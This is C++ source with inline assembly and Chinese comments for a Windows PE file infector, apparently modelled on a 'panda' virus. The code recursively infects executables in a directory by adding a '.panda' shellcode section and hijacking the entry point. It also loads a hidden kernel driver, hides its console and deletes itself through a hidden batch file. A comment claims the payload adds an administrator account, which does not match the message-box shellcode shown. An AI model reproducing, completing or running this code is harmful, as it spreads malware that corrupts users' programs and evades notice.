// ganran_pe.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "resource.h"
#include <windows.h>
#include <tlhelp32.h>
#include <Commdlg.h>
#include <malloc.h>
#include <assert.h>
#include "ico.h"

#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

bool ChangeExeIcon(LPCSTR IconFile, LPCSTR ExeFile);
char buffer[MAX_PATH],buffer2[MAX_PATH];

//本程序只适用于载入基址定位的。。。非随机基址
//感染指定目录的PE文件
char ItIs[MAX_PATH] = "C:\\1";
//添加了一个新节区
//然后shellcode是添加一个名为a，密码为a的administrator
//然后PEB定位kernel32只在我的win7 x64电脑上测试成功，可以稍许修改，以通用


//函数功能: 以ALIGN_BASE为对齐度对齐size
//参数说明: 
//		size:需要对齐的大小
//		ALIGN_BASE:对齐度
//返回值:	返回对齐后的大小
DWORD Align(DWORD size, DWORD ALIGN_BASE)
{
	assert(0 != ALIGN_BASE);
	if (size % ALIGN_BASE)
	{
		size = (size/ALIGN_BASE + 1) * ALIGN_BASE;
	}
	return size;
}

//函数功能: 检测感染标识和设置感染标识
//参数说明:
//		pDosHdr:执行DOS头
//返回值:	是否未被感染, 是->TRUE, 否->FALSE
BOOL SetFectFlag(PIMAGE_DOS_HEADER &pDosHdr)
{
	if (*(DWORD*)pDosHdr->e_res2 == 0x4B4B43)
	{
		return FALSE;
	}
	else
	{
		*(DWORD*)pDosHdr->e_res2 = 0x4B4B43;
		return TRUE;
	}
}

//函数功能:	打开文件并判断文件类型
//参数说明:	
//		szPath:文件绝对路径
//		lpMemory:保存文件内存映射地址
//返回值:	是否是PE文件, 是->TRUE, 否->FALSE
BOOL CreateFileAndCheck(char *szPath, LPVOID &lpMemory, HANDLE &hFile)
{
	//打开文件
	hFile = CreateFileA(szPath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		//printf("CreateFileA %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		return FALSE;
	}
	HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, NULL, NULL, NULL);
	if (!hMap)
	{
		//printf("CreateFileMappingA %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		return FALSE;
	}
	lpMemory = MapViewOfFile(hMap, FILE_MAP_READ|FILE_MAP_WRITE, NULL, NULL, NULL);
	if (!lpMemory)
	{
		//printf("MapViewOfFile %s Failed! ErrorCode = %d\n", szPath, GetLastError());
		CloseHandle(hMap);
		return FALSE;
	}

	CloseHandle(hMap);
	return TRUE;
}


DWORD dwNum;
PBYTE pByte;
DWORD dwOldOp;
DWORD dwNum1;
DWORD nSecSize;
DWORD size;
DWORD i;
PIMAGE_SECTION_HEADER pSecHdr;
PIMAGE_SECTION_HEADER pNewHdr;
PIMAGE_SECTION_HEADER pLastHdr;
PIMAGE_NT_HEADERS32 pNtHdr;
//函数功能: 感染指定文件
//参数说明:
//		szPath:文件绝对路径
void FectPE(char *szPath)
{
	LPVOID lpMemory;
	HANDLE hFile;
	if (!CreateFileAndCheck(szPath, lpMemory, hFile))
	{
		return;
	}
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpMemory;
	//判断DOS标识
	if (*(WORD*)pDosHdr != 23117)
		goto Err;

	 pNtHdr = (PIMAGE_NT_HEADERS32)( *(DWORD*)&pDosHdr + (DWORD)pDosHdr->e_lfanew);
	//判断NT标识
	if (*(WORD*)pNtHdr != 17744)
		goto Err;

	//设置感染标识
	if (!SetFectFlag(pDosHdr))
		goto Err;

	//检查可用空间
	if ((pNtHdr->FileHeader.NumberOfSections + 1) * sizeof(IMAGE_SECTION_HEADER) > pNtHdr->OptionalHeader.SizeOfHeaders)
		goto Err;

	 pSecHdr = (PIMAGE_SECTION_HEADER)(*(DWORD*)&pNtHdr + sizeof(IMAGE_NT_HEADERS32));
	 pNewHdr = (PIMAGE_SECTION_HEADER)(pSecHdr + pNtHdr->FileHeader.NumberOfSections);
	 pLastHdr = (PIMAGE_SECTION_HEADER)(pNewHdr - 1);

	//检测是否有附加数据
	 i = 0;
	 size = pSecHdr->PointerToRawData;
	for ( ; i<pNtHdr->FileHeader.NumberOfSections; i++)
	{
		size += Align(pSecHdr[i].SizeOfRawData, pNtHdr->OptionalHeader.FileAlignment);
	}
	if (size != GetFileSize(hFile, 0))
	{
		return;			//有附加数据
	}

	goto shellend;
	_asm
	{
shellstart:		
			CLD                 ; clear flag DF
			;store hash
			push 0x1e380a6a     ;hash of MessageBoxA
			push 0x4fd18963     ;hash of ExitProcess
			push 0x0c917432     ;hash of LoadLibraryA
			mov esi,esp         ; esi = addr of first function hash 
			lea edi,[esi-0xc]   ; edi = addr to start writing function 
			; make some stack space
			xor ebx,ebx
			mov bh, 0x04            
			sub esp, ebx 
			; push a pointer to "user32" onto stack 
			mov bx, 0x3233      ; rest of ebx is null 
			push ebx 
			push 0x72657375
			push esp 
			xor edx,edx
			; find base addr of kernel32.dll 
			mov ebx,fs:[edx+0x30]   //得到peb结构体的地址
		mov ebx,[ebx + 0xc] //得到Ldr结构体的地址
		mov ebx,[ebx + 0xc] //得到ldr.InLoadOrderModuleList.Flink 第一个模块，当前进程
		mov ebx,[ebx]   //得到第二个模块地址 ntdll.dll
		mov ebx,[ebx]   //得到第三个模块地址 kernel32.dll
		mov ebx,[ebx+0x18]  //得到第三个模块地址（kernel32模块的dllbase)
		mov ebp,ebx
find_lib_functions:
		lodsd                   ; load next hash into al and increment esi 
			cmp eax, 0x1e380a6a     ; hash of MessageBoxA - trigger 
			; LoadLibrary("user32")
			jne find_functions 
			xchg eax, ebp           ; save current hash 
			call [edi - 0x8]        ; LoadLibraryA 
			xchg eax, ebp           ; restore current hash, and update ebp 
			; with base address of user32.dll 
find_functions:
		pushad                      ; preserve registers 
			mov eax, [ebp + 0x3c]       ; eax = start of PE header 
			mov ecx, [ebp + eax + 0x78] ; ecx = relative offset of export table 
			add ecx, ebp                ; ecx = absolute addr of export table 
			mov ebx, [ecx + 0x20]       ; ebx = relative offset of names table 
			add ebx, ebp                ; ebx = absolute addr of names table 
			xor edi, edi                ; edi will count through the functions 
next_function_loop:
		inc edi                     ; increment function counter 
			mov esi, [ebx + edi * 4]    ; esi = relative offset of current function name
			add esi, ebp                ; esi = absolute addr of current function name
			cdq                         ; dl will hold hash (we know eax is small)
hash_loop:
		movsx eax, byte ptr[esi]
		cmp al,ah
			jz compare_hash
			ror edx,7
			add edx,eax
			inc esi
			jmp hash_loop
compare_hash:  
		cmp edx, [esp + 0x1c]       ; compare to the requested hash (saved on stack from pushad)
			jnz next_function_loop 
			mov ebx, [ecx + 0x24]       ; ebx = relative offset of ordinals table 
			add ebx, ebp                ; ebx = absolute addr of ordinals table 
			mov di, [ebx + 2 * edi]     ; di = ordinal number of matched function 
			mov ebx, [ecx + 0x1c]       ; ebx = relative offset of address table 
			add ebx, ebp                ; ebx = absolute addr of address table 
			add ebp, [ebx + 4 * edi]    ; add to ebp (base addr of module) the
			; relative offset of matched function 
			xchg eax, ebp               ; move func addr into eax 
			pop edi                     ; edi is last onto stack in pushad 
			stosd                       ; write function addr to [edi] and increment edi 
			push edi 
			popad                   ; restore registers 
			; loop until we reach end of last hash 
			cmp eax,0x1e380a6a
			jne find_lib_functions 
function_call:
		xor ebx,ebx
			push ebx            // cut string

		  push 0xE9D1B5CA    //构造中文字符串
			  push 0xBEB6A1B2
			  mov edx,esp
			  push ebx
			  push 0x20202031
			  push 0x32303232
			  push 0x31313130
			  push 0x322B6E61
			  push 0x7571676E
			  push 0x61686367
			  push 0x6E616978
			  mov eax,esp
			  push ebx
			  push edx
			  push eax
			  push ebx
			  call dword ptr ds:[edi-0x4]

			mov eax,0x11111111
			jmp eax
	}
shellend:
		PBYTE *pShell;
		DWORD nShellLen;
		_asm
		{
			lea eax,shellstart
		mov pShell,eax
		lea ebx,shellend
		sub ebx,eax
		mov nShellLen,ebx
	}
	//添加新节
	memcpy(pNewHdr->Name, ".panda", 6);
	//新加节virtualsize
	 nSecSize = nShellLen;
	pNewHdr->Misc.VirtualSize = nSecSize;//这个值可以不是对齐的值 ps:貌似除了这个其他都要对齐哎╮(╯▽╰)╭
	
	pNewHdr->VirtualAddress = pLastHdr->VirtualAddress + Align(pLastHdr->Misc.VirtualSize, pNtHdr->OptionalHeader.SectionAlignment);
	pNewHdr->SizeOfRawData = Align(nSecSize, pNtHdr->OptionalHeader.FileAlignment);
	pNewHdr->PointerToRawData = pLastHdr->PointerToRawData + Align(pLastHdr->SizeOfRawData, pNtHdr->OptionalHeader.FileAlignment);
	pNewHdr->Characteristics = IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_EXECUTE;

	pNtHdr->FileHeader.NumberOfSections++;
	
	pNtHdr->OptionalHeader.SizeOfImage += Align(pNewHdr->Misc.VirtualSize, pNtHdr->OptionalHeader.SectionAlignment);//这个值必须是对齐的值
//	pNtHdr->OptionalHeader.SizeOfCode += Align(pNewHdr->SizeOfRawData, pNtHdr->OptionalHeader.FileAlignment);//话说这个好像可要可不要
	//FlushViewOfFile(pDosHdr, 0);

	//写入shellcode
	dwOldOp = pNtHdr->OptionalHeader.AddressOfEntryPoint;
	printf("原始入口点: %XH\n", dwOldOp);
	dwOldOp += pNtHdr->OptionalHeader.ImageBase;
	
	printf("原始程序加载点: %XH\n", dwOldOp);
	 dwNum1 = 0;
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, pShell, nShellLen, &dwNum1, NULL);
	SetFilePointer(hFile, -6, 0, FILE_CURRENT);

	WriteFile(hFile, &dwOldOp, 4, &dwNum1, NULL);

	//写入剩余字节
	 pByte = (PBYTE)malloc(pNewHdr->SizeOfRawData-nShellLen);
	ZeroMemory(pByte, pNewHdr->SizeOfRawData-nShellLen);
	 dwNum = 0;
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, pByte, pNewHdr->SizeOfRawData-nShellLen, &dwNum, NULL);
	//FlushFileBuffers(hFile);
	free(pByte);

	pNtHdr->OptionalHeader.AddressOfEntryPoint = pNewHdr->VirtualAddress;
	//printf("新入口点: %X\n", pNewHdr->VirtualAddress);

Err:
	CloseHandle(hFile);
	UnmapViewOfFile(lpMemory);
}

//函数功能: 扫描查找文件
//参数说明:
//		szPath:需要扫描的目录
void FindFile(char *szPath)
{
	WIN32_FIND_DATAA FindFileData;
	
	char szFileToFind[MAX_PATH] = {0};
	lstrcpyA(szFileToFind, szPath);
	lstrcatA(szFileToFind, "\\*.*");

	//查找目录下所有文件
	HANDLE hFile = FindFirstFileA(szFileToFind, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("FindFirstFileA Failed!\n");
		return;
	}
	do 
	{
		char szNewPath[MAX_PATH] = {0};
		lstrcpyA(szNewPath, szPath);

		//判断是否是目录
		if (FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
		{
			//判断是否是.或..
			if (!lstrcmpA(FindFileData.cFileName, ".") || !lstrcmpA(FindFileData.cFileName, "..")){}
			else
			{
				//递归查找下级目录
				lstrcatA(szNewPath, "\\");
				lstrcatA(szNewPath, FindFileData.cFileName);
				FindFile(szNewPath);
			}
		}
		else
		{
			//处理查找到的文件
			char szExe[MAX_PATH] = {0};
			lstrcpyA(szExe, szNewPath);
			lstrcatA(szExe, "\\");
			lstrcatA(szExe, FindFileData.cFileName);
			FectPE(szExe);
			//ChangeExeIcon(buffer2,szExe);
		}
	} while (FindNextFileA(hFile, &FindFileData));

	FindClose(hFile);
}



//装载NT驱动程序
BOOL LoadNTDriver(char* lpszDriverName,char* lpszDriverPath)
{
	char szDriverImagePath[256];
	//得到完整的驱动路径
	GetFullPathName(lpszDriverPath, 256, szDriverImagePath, NULL);

	BOOL bRet = FALSE;

	SC_HANDLE hServiceMgr=NULL;//SCM管理器的句柄
	SC_HANDLE hServiceDDK=NULL;//NT驱动程序的服务句柄

	//打开服务控制管理器
	hServiceMgr = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );

	if( hServiceMgr == NULL )  
	{
		//OpenSCManager失败
		printf( "OpenSCManager() Faild %d ! \n", GetLastError() );
		bRet = FALSE;
		goto BeforeLeave;
	}
	else
	{
		////OpenSCManager成功
		printf( "OpenSCManager() ok ! \n" );  
	}

	//创建驱动所对应的服务
	hServiceDDK = CreateService( hServiceMgr,
		lpszDriverName, //驱动程序的在注册表中的名字  
		lpszDriverName, // 注册表驱动程序的 DisplayName 值  
		SERVICE_ALL_ACCESS, // 加载驱动程序的访问权限  
		SERVICE_KERNEL_DRIVER,// 表示加载的服务是驱动程序  
		SERVICE_DEMAND_START, // 注册表驱动程序的 Start 值  
		SERVICE_ERROR_IGNORE, // 注册表驱动程序的 ErrorControl 值  
		szDriverImagePath, // 注册表驱动程序的 ImagePath 值  
		NULL,  
		NULL,  
		NULL,  
		NULL,  
		NULL);  

	DWORD dwRtn;
	//判断服务是否失败
	if( hServiceDDK == NULL )  
	{  
		dwRtn = GetLastError();
		if( dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS )  
		{  
			//由于其他原因创建服务失败
			printf( "CrateService() Faild %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else  
		{
			//服务创建失败，是由于服务已经创立过
			printf( "CrateService() Faild Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n" );  
		}

		// 驱动程序已经加载，只需要打开  
		hServiceDDK = OpenService( hServiceMgr, lpszDriverName, SERVICE_ALL_ACCESS );  
		if( hServiceDDK == NULL )  
		{
			//如果打开服务也失败，则意味错误
			dwRtn = GetLastError();  
			printf( "OpenService() Faild %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else 
		{
			printf( "OpenService() ok ! \n" );
		}
	}  
	else  
	{
		printf( "CrateService() ok ! \n" );
	}

	//开启此项服务
	bRet= StartService( hServiceDDK, NULL, NULL );  
	printf("StartService bRet =%d\n",bRet);
	if( !bRet )  
	{  
		DWORD dwRtn = GetLastError();  
		printf("GetLastError = %d",dwRtn);
		if( dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING )  
		{  
			printf( "StartService() Faild %d ! \n", dwRtn );  
			bRet = FALSE;
			goto BeforeLeave;
		}  
		else  
		{  
			if( dwRtn == ERROR_IO_PENDING )  
			{  
				//设备被挂住
				printf( "StartService() Faild ERROR_IO_PENDING ! \n");
				bRet = FALSE;
				goto BeforeLeave;
			}  
			else  
			{  
				//服务已经开启
				printf( "StartService() Faild ERROR_SERVICE_ALREADY_RUNNING ! \n");
				bRet = TRUE;
				goto BeforeLeave;
			}  
		}  
	}
	bRet = TRUE;
//离开前关闭句柄
BeforeLeave:
	if(hServiceDDK)
	{
		CloseServiceHandle(hServiceDDK);
	}
	if(hServiceMgr)
	{
		CloseServiceHandle(hServiceMgr);
	}
	return bRet;
}

//卸载驱动程序  
BOOL UnloadNTDriver( char * szSvrName )  
{
	BOOL bRet = FALSE;
	SC_HANDLE hServiceMgr=NULL;//SCM管理器的句柄
	SC_HANDLE hServiceDDK=NULL;//NT驱动程序的服务句柄
	SERVICE_STATUS SvrSta;
	//打开SCM管理器
	hServiceMgr = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );  
	if( hServiceMgr == NULL )  
	{
		//带开SCM管理器失败
		printf( "OpenSCManager() Faild %d ! \n", GetLastError() );  
		bRet = FALSE;
		goto BeforeLeave;
	}  
	else  
	{
		//带开SCM管理器失败成功
		printf( "OpenSCManager() ok ! \n" );  
	}
	//打开驱动所对应的服务
	hServiceDDK = OpenService( hServiceMgr, szSvrName, SERVICE_ALL_ACCESS );  
	
	if( hServiceDDK == NULL )  
	{
		//打开驱动所对应的服务失败
		printf( "OpenService() Faild %d ! \n", GetLastError() );  
		bRet = FALSE;
		goto BeforeLeave;
	}  
	else  
	{  
		printf( "OpenService() ok ! \n" );  
	}  
	//停止驱动程序，如果停止失败，只有重新启动才能，再动态加载。  
	if( !ControlService( hServiceDDK, SERVICE_CONTROL_STOP , &SvrSta ) )  
	{  
		printf( "ControlService() Faild %d !\n", GetLastError() );  
	}  
	else  
	{
		//打开驱动所对应的失败
		printf( "ControlService() ok !\n" );  
	}  
	//动态卸载驱动程序。  
	if( !DeleteService( hServiceDDK ) )  
	{
		//卸载失败
		printf( "DeleteSrevice() Faild %d !\n", GetLastError() );  
	}  
	else  
	{  
		//卸载成功
		printf( "DelServer:eleteSrevice() ok !\n" );  
	}  
	bRet = TRUE;
BeforeLeave:
	//离开前关闭打开的句柄
	if(hServiceDDK)
	{
		CloseServiceHandle(hServiceDDK);
	}
	if(hServiceMgr)
	{
		CloseServiceHandle(hServiceMgr);
	}
	return bRet;	
} 
	
void SelfDel()
{
	char DirBuffer[MAX_PATH],TempBuffer[MAX_PATH];
	char temp[MAX_PATH];
	HMODULE hModule = GetModuleHandle(NULL);
	GetModuleFileName(hModule,DirBuffer,sizeof(DirBuffer));
	
	GetFileTitle(DirBuffer,TempBuffer,MAX_PATH);
	
	char *str = strrchr(DirBuffer,'\\');
	int result = str - DirBuffer + 1;
	for (int i=0;i<result;i++)
	{
		temp[i] = DirBuffer[i];
	}
	temp[i] = '\0';
	
	strcat(temp,"system.bat");
	// 生过程自删除批处理文件
	FILE *fp;
	fp = fopen(temp,"wb+");
	fprintf(fp,"@echo off\r\n");
	fprintf(fp,":start\r\n\tif not exist %s goto done\r\n",TempBuffer);
	fprintf(fp,"\tdel /f /q %s\r\n",TempBuffer);
	fprintf(fp,"\tdel /f /q sys.sys\r\n");	
	fprintf(fp,"\tdel /f /q panda.ico\r\n");	
	
	fprintf(fp,"goto start\r\n");
	fprintf(fp,":done\r\n");
	fprintf(fp,"\tdel /f /q %%0\r\n");
	fclose(fp);
	/*
@echo off
:start
	if not exist xxx.exe goto done
	del /f /q xxx.exe
	del /f /q sys.sys
goto start
:done
	del /f /q %0

*/
	// 隐藏运行批处理完成自删除
	WinExec(temp,SW_HIDE);
	
}
struct ICONDIRENTRY {  
	BYTE bWidth;  
	BYTE bHeight;  
	BYTE bColorCount;  
	BYTE bReserved;  
	WORD wPlanes;  
	WORD wBitCount;  
	DWORD dwBytesInRes;  
	DWORD dwImageOffset;  
};  

struct ICONDIR {  
	WORD idReserved;  
	WORD idType;  
	WORD idCount;  
	//ICONDIRENTRY idEntries;  
};  

struct GRPICONDIRENTRY {  
	BYTE bWidth;  
	BYTE bHeight;  
	BYTE bColorCount;  
	BYTE bReserved;  
	WORD wPlanes;  
	WORD wBitCount;  
	DWORD dwBytesInRes;  
	WORD nID;  
};  

struct GRPICONDIR {  
	WORD idReserved;  
	WORD idType;  
	WORD idCount;  
	GRPICONDIRENTRY idEntries;  
};  
bool ChangeExeIcon(LPCSTR IconFile, LPCSTR ExeFile) {  
	ICONDIR stID;  
	ICONDIRENTRY stIDE;  
	GRPICONDIR stGID;  
	HANDLE hFile;  
	DWORD nSize, nGSize, dwReserved;  
	HANDLE hUpdate;  
	PBYTE pIcon, pGrpIcon;  
	BOOL ret;  

	hFile = CreateFile(IconFile, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);  
	if (hFile == INVALID_HANDLE_VALUE) {  
		return false;  
	}  

	ZeroMemory(&stID, sizeof(ICONDIR));  
	ret = ReadFile(hFile, &stID, sizeof(ICONDIR), &dwReserved, NULL);  

	ZeroMemory(&stIDE, sizeof(ICONDIRENTRY));  
	ret = ReadFile(hFile, &stIDE, sizeof(ICONDIRENTRY), &dwReserved, NULL);  

	nSize = stIDE.dwBytesInRes;  
	pIcon = (PBYTE) malloc(nSize);  
	SetFilePointer(hFile, stIDE.dwImageOffset, NULL, FILE_BEGIN);  
	ret = ReadFile(hFile, (LPVOID) pIcon, nSize, &dwReserved, NULL);  
	if (!ret) {  
		CloseHandle(hFile);  
		return false;  
	}  

	ZeroMemory(&stGID, sizeof(GRPICONDIR));  
	stGID.idCount = stID.idCount;  
	stGID.idReserved = 0;  
	stGID.idType = 1;  
	CopyMemory(&stGID.idEntries, &stIDE, 12);  
	stGID.idEntries.nID = 0;  

	nGSize = sizeof(GRPICONDIR);  
	pGrpIcon = (PBYTE) malloc(nGSize);  
	CopyMemory(pGrpIcon, &stGID, nGSize);  

	hUpdate = BeginUpdateResource(ExeFile, false);  
	ret = UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), 0, (LPVOID) pGrpIcon, nGSize);  
	ret = UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(1), 0, (LPVOID) pIcon, nSize);  
	EndUpdateResource(hUpdate, false);  
	if (!ret) {  
		CloseHandle(hFile);  
		return false;  
	}  

	CloseHandle(hFile);  
	return true;  
}  



#define FILE_DEVICE_UNKNOWN 0x00000022
#define METHOD_BUFFERED 0
#define FILE_READ_ACCESS ( 0x0001 ) 
#define FILE_WRITE_ACCESS ( 0x0002 ) 

#define CTL_CODE( DeviceType, Function, Method, Access ) ( ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) )

#define IOCTL_START_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN,0x0801, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

//主函数
int main()
{
	GetCurrentDirectory(MAX_PATH,buffer);
	strcat(buffer,"\\sys.sys");
	GetCurrentDirectory(MAX_PATH,buffer2);
	strcat(buffer2,"\\panda.ico");
	
	HRSRC hRsrc = FindResource(NULL,MAKEINTRESOURCE(IDR_SYS1),TEXT("SYS"));//生成驱动
	HGLOBAL hGlobal = LoadResource(NULL,hRsrc);
	LPVOID res = LockResource(hGlobal);
	DWORD size = SizeofResource(NULL,hRsrc);
	HANDLE hFile = CreateFile(buffer,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD dwWrited;
	WriteFile(hFile,res,size,&dwWrited,NULL);
	CloseHandle(hFile);

	LoadNTDriver("HideDriver",buffer);

	HANDLE hFile2 = CreateFile(buffer2,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD dwWrited2;
	WriteFile(hFile2,data,sizeof(data),&dwWrited2,NULL);
	CloseHandle(hFile2);
	

	printf("加载driver %s ,准备感染!",buffer);
	//getchar();
	FindFile(ItIs);

	MessageBox(NULL,"成功完成任务","成功完成任务",MB_OK);
	UnloadNTDriver("HideDriver");
	
	SelfDel();	

	

	return 0;
}